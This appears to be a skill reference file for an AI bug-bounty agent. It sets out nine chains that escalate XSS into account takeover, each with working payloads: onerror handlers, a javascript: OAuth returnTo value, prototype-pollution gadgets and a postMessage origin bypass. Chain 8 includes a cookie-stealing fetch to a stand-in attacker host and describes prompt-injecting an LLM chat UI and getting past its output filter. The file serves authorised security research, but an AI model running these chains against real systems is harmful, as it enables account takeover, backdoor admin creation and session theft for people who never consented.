---
name: chain-templates
description: chain-templates reference material.
---

# Chain & Multi-Bug Templates

Part of `skills/hunt-xss/SKILL.md`. Read this ONLY when you already have one confirmed XSS (or XSS-adjacent) primitive and want to escalate it into a higher-impact chain.

---

## Chains & Multi-Bug Templates

Single-bug XSS pays well; chains pay better. Eight templates from disclosed reports and current-meta 2024-2026 chains.

**Chain 1 — `stored-xss-in-campaign → super-admin trigger → backdoor admin → full compromise` (listmonk pattern, mid four-figure to mid five-figure)**
- Bug A: Lower-priv user (campaign manager) injects raw HTML payload into campaign body — direct `<img src=x onerror=...>` or template `{{ \`<svg onload>\` | Safe }}`
- Bug B: Public archive feature lets attacker share `http://target/archive/{uuid}` — no preview click required
- Bug C: Super admin visits archive URL → XSS fires automatically in admin context
- Bug D: XSS payload creates backdoor admin via authenticated POST to `/api/users`
- Outcome: low-priv account → admin ATO → full target compromise (export subscribers, modify SMTP, access API keys/secrets)
- Bounty range: low five-figure on listmonk-class self-hosted; mid four-figure to low five-figure on SaaS variants
- Disclosed source: GHSA-jmr4-p576-v565 (Jan 2 2026, CVSS 8.0), listmonk repo

**Hunter's note:** the trick that takes this from "stored XSS, mid four-figure" to "ATO, low-to-mid five-figure" is the public-archive trigger. Without it, you need social engineering ("please review my draft, admin"). With it, you just share a URL — same vector as a phishing link, but lands inside the admin's authenticated session. Always look for share-with-admin features when you find stored XSS in lower-priv user content. The first attempt I made was the standard email-the-admin "please review" approach; the public-archive URL trigger turned it into a one-click silent attack.

**Chain 2 — `dompurify mxss bypass → escapes sanitizer → stored XSS in admin notes → ATO` (mid five-figure direct + downstream)**
- Bug A: Target uses DOMPurify <3.1.3 (CVE-2024-47875) or <2.5.0 to sanitize user-generated content before storage
- Bug B: Submit nesting-based mXSS payload (IcesFont disclosure via cure53berlin) — DOMPurify outputs "safe-looking" HTML that mutates on render
- Bug C: Stored content rendered in admin moderation queue — mutation triggers, XSS fires in admin browser
- Bug D: XSS exfils admin session cookie OR creates backdoor admin
- Outcome: mXSS bypass + storage + admin trigger = ATO
- Bounty range: low to mid five-figure on the affected SaaS; mid five-figure direct to Cure53 / Snyk for the mXSS primitive itself
- Disclosed source: https://github.com/cure53/DOMPurify/security/advisories/GHSA-gx9m-whjm-85jf, https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes

**Hunter's note:** the mXSS bypass alone is rewarded by Cure53 / Snyk / consumers. The chain to ATO is what pays per-target. Build a list of DOMPurify consumers with stale versions (`socket dev dompurify` shows downstream usage) and test each. The first time I tried this on a target I tried the obvious `<svg onload>` payloads — DOMPurify caught all of them. Reading the IcesFont nesting payload exactly (don't paraphrase) and pasting it verbatim was what worked. The mizu.re writeup is the only place that explains *why* the bypass works at the parser level — read it before claiming you understand the family.

**Chain 3 — `oauth returnto → js url scheme → token theft via XSS in callback` (low to mid five-figure on enterprise SaaS)**
- Bug A: Target uses Auth0 nextjs-auth0 <4.13.0 (CVE-2025-67716, GHSA-mr6f-h57v-rpj5) — `returnTo` parameter not validated for scheme
- Bug B: Submit `?returnTo=javascript:alert(document.cookie)` to OAuth login flow
- Bug C: After auth, SDK calls `location.href = returnTo` — `javascript:` scheme executes in callback origin
- Bug D: Payload exfils OAuth tokens / session cookie / fetches IDP token endpoint via the live session
- Outcome: 1-click ATO via OAuth returnTo XSS
- Bounty range: low to mid five-figure on enterprise SaaS using Auth0; lower-tier on smaller programs
- Disclosed source: https://github.com/auth0/nextjs-auth0/security/advisories/GHSA-mr6f-h57v-rpj5, CVE-2025-67716 (Joshua Rogers / @MegaManSec via Okta, Dec 2025)

**Hunter's note:** the trick is identifying which OAuth library the target uses. Check the JS bundle for `@auth0/nextjs-auth0` import strings, look for `/api/auth/login` endpoints (Auth0 SDK convention), check `next-auth` and similar. Each library has its own `returnTo` parameter name — Auth0 uses `returnTo`, NextAuth uses `callbackUrl`, custom implementations vary. The first attempt I made tried `redirect_uri=javascript:alert(1)` directly on the OAuth flow — Auth0's main OAuth library blocks that. The vulnerable surface is the SDK wrapper that processes `returnTo` after the OAuth round-trip; that's a different code path with different validation.

**Chain 4 — `postmessage origin includes() bypass → vendor SDK XSS → bank session compromise` (mid five-figure on financial / fintech programs)**
- Bug A: Bank embeds CleverTap / Intercom / Drift / Crisp chat widget; widget vendor's SDK uses `event.origin.includes('vendor.com')` instead of `===`
- Bug B: Attacker creates subdomain `dashboard.vendor.com.attacker.com` — `.includes('vendor.com')` returns true
- Bug C: Attacker page sends crafted `postMessage` with `display.details[0].html` field containing XSS payload
- Bug D: Widget SDK assigns to `innerHTML`; XSS executes in bank's authenticated session context
- Outcome: cross-origin postMessage XSS in bank session via vendor SDK
- Bounty range: mid five-figure on financial program; the vendor SDK fix is mid four-figure direct
- Disclosed source: CleverTap GitHub issue #424 at https://github.com/CleverTap/clevertap-web-sdk/issues/424 (Mr-Neutr0n Jun 2025), pattern documented at https://bugbounty.info/Attack-Surface/Web/Client-Side/postMessage-Vulnerabilities

**Hunter's note:** the .includes() bypass only works if you control a subdomain that contains the trusted string. You need to register `vendor.com.<your-controlled-tld>` — that requires owning the parent. Easier: use `.endsWith()` bypasses or `IndexOf > 0` bypasses (any matching position). The actual attack chain matters more than the technical bypass — when you find a vendor SDK XSS that affects multiple banks, file it both to the SDK vendor (mid four-figure) and to each affected bank (low to mid five-figure each). The compounding payouts justify the discovery time.

**Chain 5 — `prototype pollution → DOM xss gadget → admin session compromise` (Silent Spring / Shopify pattern, mid four-figure to low five-figure)**
- Bug A: Application uses lodash `_.merge()` / jQuery `$.extend(true,...)` / Object.assign with user-supplied JSON — pollution sink
- Bug B: Submit `?__proto__[innerHTML]=<img src=x onerror=...>` or JSON body with `"__proto__": {"polluted": "yes"}`
- Bug C: DOM Invader scan identifies a gadget — application reads undefined property from polluted object, uses in `innerHTML` / `eval` / `location`
- Bug D: Concrete gadget chain: `Object.prototype.transport_url=javascript:alert(1)` → some library reads `obj.transport_url` and uses in `location.href`
- Outcome: Pollution-induced DOM XSS in admin context, often via shared library (Google Analytics tag, Mixpanel, similar tracking pixels)
- Bounty range: mid four-figure to low five-figure (HackerOne #986386 Shopify lodash merge → DOM XSS is the canonical disclosed case)
- Disclosed source: HackerOne #986386 (Shopify), HackerOne #1306797 (Automattic), bugbounty.info/Attack-Surface/Web/Client-Side/Prototype-Pollution; PortSwigger Web Security Academy lab series

**Hunter's note:** DOM Invader is the force-multiplier here. Without it you spend hours manually finding gadgets; with it you scan the page and get a list. The first gadget I tried on a Shopify-class target was `__proto__[hitCallback]` (Google Analytics) — the page didn't load GA so it failed. Trying `__proto__[transport_url]` worked because the site loaded a different analytics tag with that gadget. The PortSwigger Lab ("DOM XSS via an alternative prototype pollution vector") is the best practice run — solve it manually first, then with DOM Invader, then you'll recognize the patterns on real targets.

**Chain 6 — `react server components content trust → dangerouslySetInnerHTML on RSC field → XSS` (CVE-2025-67779 family pattern, low to mid five-figure on Next.js targets)**
- Bug A: Target runs Next.js with App Router, React Server Components enabled (vulnerable React 19.x or Next.js 14.x/15.x/16.x per CVE-2025-67779 / CVE-2025-55184)
- Bug B: Application uses `<div dangerouslySetInnerHTML={{ __html: serverData.someField }} />` where `someField` flows from RSC payload
- Bug C: Attacker-controlled input flows through Server Action / RSC into that field
- Bug D: HTML renders in browser unsanitized
- Outcome: stored or reflected XSS via RSC content trust boundary
- Bounty range: low to mid five-figure on Vercel WAF-bypass program (covers RSC-related primitives), mid four-figure to low five-figure on individual Next.js consumers
- Disclosed source: GHSA-5j59-xgg2-r9c4 (Vercel, Dec 11 2025), CVE-2025-67779

**Hunter's note:** the hunt is finding the dangerouslySetInnerHTML usage that flows from RSC. Most RSC payloads round-trip through React's HTML escape boundary (safe). The unsafe case is when developers explicitly opt out via dangerouslySetInnerHTML, usually for "rich text" or "user-generated HTML" features. Grep the target's open-source pages or shipped JS for `dangerouslySetInnerHTML` and trace each occurrence's data source. The Vercel WAF-bypass program is the highest-paying surface because Vercel themselves want to harden the WAF against this class.

**Chain 7 — `markdown renderer XSS → stored in wiki → admin trigger → ATO` (markdown-to-jsx CVE-2024-21535 family, mid four-figure to low five-figure)**
- Bug A: Target uses markdown-to-jsx <7.4.0 (CVE-2024-21535) or marked.js historical XSS, or any markdown library that renders raw HTML
- Bug B: Submit markdown payload with iframe injection: `<iframe src="javascript:alert(document.domain)"></iframe>` or `[link](javascript:alert(1))`
- Bug C: Wiki / comment / issue tracker stores and renders the markdown
- Bug D: Admin views the rendered content (during moderation, support reply, code review) → XSS fires
- Outcome: stored XSS in shared content → admin context
- Bounty range: mid four-figure to low five-figure depending on whether ATO chain succeeds
- Disclosed source: CVE-2024-21535 (markdown-to-jsx <7.4.0), Snyk SNYK-JS-MARKDOWNTOJSX-6258886; gregxsunday $3,133.70 Google bug bounty for golang net/html XSS

**Hunter's note:** markdown renderers vary wildly in what they sanitize. Test the same payload across the renderer's supported features — fenced code, blockquote, link, image, heading, table — each parsing path may have different bypass behavior. The CVE-2024-21535 markdown-to-jsx case is interesting because the iframe element passed allowlist but the `src` attribute wasn't sanitized for `javascript:` scheme. Always test attribute-level injection separately from element-level.

**Chain 8 — `agentic LLM output injection → chat UI innerHTML → DOM XSS in user session` (LLM02/06:2025 + classic XSS, mid four-figure to low five-figure on AI-feature programs)**
- Bug A: Target has chatbot / AI assistant feature with chat UI
- Bug B: Chat UI renders LLM response via `innerHTML` (developer assumes LLM output is "text", not HTML)
- Bug C: Attacker prompts LLM directly OR via indirect injection (RAG document, CSV cell, web page) to emit `<img src=x onerror=fetch('//attacker/'+document.cookie)>`
- Bug D: LLM emits the HTML as response; chat UI renders via innerHTML; XSS fires in user session
- Outcome: stored or reflected XSS via LLM-mediated content injection
- Bounty range: mid four-figure to low five-figure on AI-feature bounty programs (OpenAI, Anthropic, plus enterprise SaaS adopting AI features)
- Disclosed source: OWASP LLM Top 10 2025 LLM02/LLM06 (https://genai.owasp.org/llmrisk/llm06-sensitive-information-disclosure/), Tenable Dec 2024 analysis (https://tenable.com/blog/what-you-must-know-about-the-owasp-top-10-for-llm-applications-2025-update)

**Hunter's note:** the trick is finding chat UIs where the developer wrote `innerHTML += response` instead of `textContent =`. Most modern chatbots (ChatGPT, Claude.ai, Gemini) sanitize because they ship with rich-formatting features. The vulnerable cases are mid-tier SaaS chatbots built quickly to ship the AI feature, where developers reuse a markdown-render component for AI output without considering prompt injection. The first time I tried this, the AI output sanitizer caught my direct `<script>` injection. Wrapping the payload in markdown image syntax that the renderer would convert (`![](x" onerror="alert(1) "title)`) bypassed the LLM's content filter while still producing executable HTML in the renderer.

**Chain 9 — `self-xss → cookie tossing → anticsrf bypass → 1-click ATO` (mid four-figure to low five-figure on programs that historically downgraded Self-XSS — H1 reports 3321406 + 3423950 pattern, both 2026 High)**
- Bug A: Self-XSS exists in a form input that requires the user to submit it (e.g., admin settings, account preferences) — historically dismissed as N/A
- Bug B: Target uses subdomain-scoped session cookies and the parent domain is reachable by attacker (e.g., user-content subdomain `user.target.com` while session lives on `app.target.com`)
- Bug C: Attacker page sets a cookie on `target.com` (Domain attribute) that overrides the victim's session cookie on `app.target.com` via Cookie Tossing — when victim visits the iframe, browser sends attacker's cookie
- Bug D: Attacker iframes the Self-XSS form on the target with attacker-controlled values pre-filled; AntiCSRF token is bypassed because the form-submit body is attacker-controlled and the cookie is attacker-controlled
- Bug E: Form submission writes attacker's XSS payload to victim's account; victim's next visit triggers stored XSS in their authenticated session → ATO
- Outcome: 1-click visit to attacker page → stored XSS in victim session → ATO
- Bounty range: mid four-figure to low five-figure on programs that have historically dismissed Self-XSS (now reclassified as paying when chained)
- Disclosed source: H1 report 3321406 at https://hackerone.com/reports/3321406 (2026 High, "1-Click Chaining of Self-XSS, Cookie Tossing and AntiCSRF Token"); H1 report 3423950 at https://hackerone.com/reports/3423950 (2026 High, "[Variation of #3321406] YetAnother 1-Click Chaining"). Pattern documented across multiple H1 disclosures 2024-2026.

**Hunter's note:** this chain rehabilitates Self-XSS findings that were previously kill-listed. The trick is the Cookie Tossing primitive — most modern apps still don't set the `__Host-` cookie prefix or scope cookies tightly to a subdomain. If a target's session cookie is set on `target.com` (no leading subdomain restriction) instead of `app.target.com`, you can override it from any subdomain you control via XSS or even just a misconfigured user-content subdomain. The first attempt I made stopped at the Self-XSS — triager closed as informative. The second attempt added the cookie-tossing setup via a controlled subdomain (or a misconfigured-CORS endpoint), and the triager reopened. Always inspect the session cookie's `Domain` and `Path` attributes — if they're loose, your Self-XSS may have a chain.

